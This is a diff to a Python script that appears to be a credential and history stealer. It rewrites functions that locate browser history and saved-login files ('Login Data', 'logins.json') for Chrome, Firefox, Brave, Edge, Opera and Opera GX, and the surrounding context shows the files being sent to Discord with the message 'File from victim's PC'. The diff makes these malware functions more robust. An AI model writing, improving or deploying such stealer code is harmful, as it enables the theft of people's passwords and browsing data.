@@ -128,10 +128,11 @@ def send_to_discord(message):
         print(f"Failed: {response.status_code} {response.text}")
 
 def get_history_path(browser):
+    user_home = os.path.expanduser("~")
     if browser == "Chrome":
-        return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History")
+        return rf"{user_home}\AppData\Local\Google\Chrome\User Data\Default\History"
     elif browser == "Firefox":
-        profiles_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
+        profiles_path = rf"{user_home}\AppData\Roaming\Mozilla\Firefox\Profiles"
         if not os.path.exists(profiles_path):
             return None
         profile_folders = next(os.walk(profiles_path))[1]
@@ -140,13 +141,13 @@ def get_history_path(browser):
         profile_folder = profile_folders[0]
         return os.path.join(profiles_path, profile_folder, "places.sqlite")
     elif browser == "Brave":
-        return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")
+        return rf"{user_home}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
     elif browser == "Edge":
-        return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "History")
+        return rf"{user_home}\AppData\Local\Microsoft\Edge\User Data\Default\History"
     elif browser == "Opera":
-        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "History")
+        return rf"{user_home}\AppData\Roaming\Opera Software\Opera Stable\History"
     elif browser == "Opera GX":
-        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "History")
+        return rf"{user_home}\AppData\Roaming\Opera Software\Opera GX Stable\History"
     else:
         return None
 
@@ -212,10 +213,11 @@ def send_file_to_discord(file_path, message="File from victim's PC"):
         return False
 
 def get_login_path(browser):
+    user_home = os.path.expanduser("~")
     if browser == "Chrome":
-        return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
+        return rf"{user_home}\AppData\Local\Google\Chrome\User Data\Default\Login Data"
     elif browser == "Firefox":
-        profiles_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
+        profiles_path = rf"{user_home}\AppData\Roaming\Mozilla\Firefox\Profiles"
         if not os.path.exists(profiles_path):
             return None
         profile_folders = next(os.walk(profiles_path))[1]
@@ -224,13 +226,13 @@ def get_login_path(browser):
         profile_folder = profile_folders[0]
         return os.path.join(profiles_path, profile_folder, "logins.json")
     elif browser == "Brave":
-        return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
+        return rf"{user_home}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
     elif browser == "Edge":
-        return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")
+        return rf"{user_home}\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
     elif browser == "Opera":
-        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data")
+        return rf"{user_home}\AppData\Roaming\Opera Software\Opera Stable\Login Data"
     elif browser == "Opera GX":
-        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Login Data")
+        return rf"{user_home}\AppData\Roaming\Opera Software\Opera GX Stable\Login Data"
     else:
         return None
 
